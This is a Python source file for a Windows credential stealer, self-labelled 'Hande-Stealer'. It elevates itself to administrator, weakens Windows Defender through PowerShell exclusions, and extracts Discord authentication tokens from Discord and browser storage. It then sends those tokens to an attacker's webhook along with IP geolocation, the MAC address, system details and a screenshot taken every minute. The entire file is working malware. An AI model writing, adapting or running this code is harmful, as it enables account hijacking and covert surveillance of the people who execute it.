import os
import re
import platform
import time
import requests
from io import BytesIO
import json
from dhooks import Webhook, Embed, File
from datetime import datetime
from PIL import ImageGrab
import sys
import win32com.shell.shell as shell
from getmac import get_mac_address as gma
ASADMIN = 'asadmin'

if sys.argv[-1] != ASADMIN:
    script = os.path.abspath(sys.argv[0])
    params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
    shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
    sys.exit(0)

os.system("powershell.exe -command Add-MpPreference -ExclusionExtension .exe")
os.system("powershell.exe -command Set-MpPreference -EnableControlledFolderAccess Disabled")
os.system("powershell.exe -command Set-MpPreference -PUAProtection disable")


hook = Webhook("https://Your Webhook Url") #change this
embed = Embed(
    description='Hande-Stealer From Swagkarna and Dagger Devs! :smiley:',
    color=0x5CDBF0,
    timestamp='now'  
    )
image1 = 'https://avatars.githubusercontent.com/u/51061101?v=4'


embed.set_author(name='Author : swagkarna', icon_url=image1)
embed.add_field(name='Github Profile', value='https://github.com/DaggerDevs')

embed.set_thumbnail(image1)

hook.send(embed=embed)

def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens
    
time.sleep(1)    
    
def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    message = ''
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                message += f'`{token}`\n\n'
        else:
            message += 'No tokens found.\n'


        hook.send(f'{platform}\n{message}')


main()


def stealip():

    time = datetime.now().strftime("%H:%M %p")  
    ip = requests.get('https://api.ipify.org/').text

    r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
    geo = r.json()
    embed = Embed()
    fields = [
    {'name': 'IP', 'value': geo['query']},
    {'name': 'ipType', 'value': geo['ipType']},
    {'name': 'Country', 'value': geo['country']},
    {'name': 'City', 'value': geo['city']},
    {'name': 'Continent', 'value': geo['continent']},
    {'name': 'Country', 'value': geo['country']},
    {'name': 'IPName', 'value': geo['ipName']},
    {'name': 'ISP', 'value': geo['isp']},
    {'name': 'Latitute', 'value': geo['lat']},
    {'name': 'Longitude', 'value': geo['lon']},
    {'name': 'Org', 'value': geo['org']},
    {'name': 'Region', 'value': geo['region']},
    {'name': 'Status', 'value': geo['status']},
]
    for field in fields:
        if field['value']:
            embed.add_field(name=field['name'], value=field['value'], inline=True)
    hook.send(embed=embed)  


def stealscreen() :
   try:
       
    screen = ImageGrab.grab()
    screen.save(os.getenv("APPDATA") + '\\Screenshot.jpg')



    rip = os.getenv("APPDATA")

    os.chdir(rip)

    print(rip)


    file = File('Screenshot.jpg', name='Screenshot.jpg')

    hook.send('Screenshots:', file=file)

    
   	
  		
   except:
    print("Error")


def stealmac():
    y = gma()
    hook.send("Mac Address : ")
    hook.send(y)
stealmac()    

def GetSysInfo():
    my_system = platform.uname()
    hook.send("System Information : ")
    hook.send(f"System: {my_system.system}")
    hook.send(f"Node Name: {my_system.node}")
    hook.send(f"Release: {my_system.release}")
    hook.send(f"Version: {my_system.version}")
    hook.send(f"Machine: {my_system.machine}")
    hook.send(f"Processor: {my_system.processor}")

    
GetSysInfo()

stealip()

while True :
    time.sleep(60)
    stealscreen()
